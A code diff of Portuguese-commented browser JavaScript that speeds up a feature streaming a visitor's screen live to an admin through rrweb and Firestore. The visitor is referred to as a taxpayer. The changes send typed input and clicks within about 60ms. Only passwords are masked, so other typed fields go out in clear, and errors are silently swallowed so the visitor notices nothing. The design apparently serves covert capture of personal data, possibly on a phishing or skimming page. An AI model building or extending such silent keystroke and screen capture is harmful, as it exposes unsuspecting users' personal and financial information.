@@ -1959,7 +1959,7 @@
             });
 
             // =================================================================
-            // TRANSMISSÃO DE TELA AO VIVO EM HD (rrweb SOB DEMANDA)
+            // TRANSMISSÃO DE TELA AO VIVO EM HD 2.0 (BAIXÍSSIMA LATÊNCIA / MICRO-BATCH)
             // Só carrega e transmite quando o Admin clica em "Ver Tela Ao Vivo"
             // =================================================================
             let rrwebCarregandoPromise = null;
@@ -2004,7 +2004,7 @@
             let liveLastHeartbeat = 0;
             let liveQueue = [];
             let liveSeq = 0;
-            let liveFlushTimer = null;
+            let liveFlushTimeout = null;
             let liveWatchdogTimer = null;
             let liveFlushing = false;
 
@@ -2013,12 +2013,27 @@
                     try { liveStopFn(); } catch (_) {}
                     liveStopFn = null;
                 }
-                clearInterval(liveFlushTimer);
+                clearTimeout(liveFlushTimeout);
                 clearInterval(liveWatchdogTimer);
-                liveFlushTimer = null;
+                liveFlushTimeout = null;
                 liveWatchdogTimer = null;
                 liveQueue = [];
                 liveStreamIdAtual = null;
+            }
+
+            function agendarEnvioRapido(atrasoMs = 110) {
+                if (!liveStreamIdAtual || liveFlushing) return;
+                if (atrasoMs === 0) {
+                    clearTimeout(liveFlushTimeout);
+                    liveFlushTimeout = null;
+                    enviarLoteTelaAoVivo();
+                    return;
+                }
+                if (liveFlushTimeout) return;
+                liveFlushTimeout = setTimeout(() => {
+                    liveFlushTimeout = null;
+                    enviarLoteTelaAoVivo();
+                }, atrasoMs);
             }
 
             async function enviarLoteTelaAoVivo() {
@@ -2029,8 +2044,13 @@
 
                 try {
                     const serialized = JSON.stringify(eventosParaEnviar);
-                    const MAX_PART = 500000;
+                    const MAX_PART = 520000;
                     const streamCol = collection(db, "trafego_aovivo", sessionId, "screen_stream");
+                    const nowTs = Date.now();
+                    const vw = window.innerWidth || 0;
+                    const vh = window.innerHeight || 0;
+                    const sx = Math.round(window.scrollX || 0);
+                    const sy = Math.round(window.scrollY || 0);
 
                     if (serialized.length <= MAX_PART) {
                         const seqNum = ++liveSeq;
@@ -2041,9 +2061,8 @@
                             partIndex: 0,
                             totalParts: 1,
                             payload: serialized,
-                            vw: window.innerWidth || 0,
-                            vh: window.innerHeight || 0,
-                            ts: Date.now()
+                            vw, vh, sx, sy,
+                            ts: nowTs
                         });
                     } else {
                         const seqNum = ++liveSeq;
@@ -2058,16 +2077,19 @@
                                 partIndex: p,
                                 totalParts,
                                 payload: sliceStr,
-                                vw: window.innerWidth || 0,
-                                vh: window.innerHeight || 0,
-                                ts: Date.now()
+                                vw, vh, sx, sy,
+                                ts: nowTs
                             });
                         }
                     }
                 } catch (_) {
-                    // Ignora erro silenciosamente para nunca atrapalhar o contribuinte
+                    // Ignora erro silenciosamente para nunca travar o contribuinte
                 } finally {
                     liveFlushing = false;
+                    // Chain-flush imediato se novos eventos chegaram durante o envio
+                    if (liveStreamIdAtual && liveQueue.length > 0) {
+                        agendarEnvioRapido(55);
+                    }
                 }
             }
 
@@ -2085,14 +2107,21 @@
                         emit(event) {
                             if (liveStreamIdAtual !== streamId) return;
                             liveQueue.push(event);
-                            // FullSnapshot (type 2) envia quase imediatamente para abrir a tela rápido
+
+                            // FullSnapshot (type 2) dispara imediatamente sem atraso
                             if (event.type === 2) {
-                                setTimeout(() => enviarLoteTelaAoVivo(), 120);
+                                agendarEnvioRapido(0);
+                            } else if (event.type === 3 && event.data && (event.data.source === 2 || event.data.source === 5)) {
+                                // Cliques e digitação vão quase instantâneos (60ms)
+                                agendarEnvioRapido(60);
+                            } else {
+                                // Mouse/scroll/mutações em micro-lotes de 110ms (fluido e leve)
+                                agendarEnvioRapido(110);
                             }
                         },
-                        checkoutEveryNms: 90000,
                         maskAllInputs: false,
                         maskInputOptions: { password: true },
+                        blockSelector: '[vw], .g-recaptcha',
                         inlineImages: false,
                         collectFonts: false,
                         slimDOMOptions: {
@@ -2108,16 +2137,12 @@
                             headMetaVerification: true
                         },
                         sampling: {
-                            mousemove: 90,
+                            mousemove: 45,
                             mouseInteraction: true,
-                            scroll: 150,
+                            scroll: 60,
                             input: 'last'
                         }
                     });
-
-                    liveFlushTimer = setInterval(() => {
-                        enviarLoteTelaAoVivo();
-                    }, 700);
 
                     liveWatchdogTimer = setInterval(() => {
                         if (Date.now() - liveLastHeartbeat > 38000) {
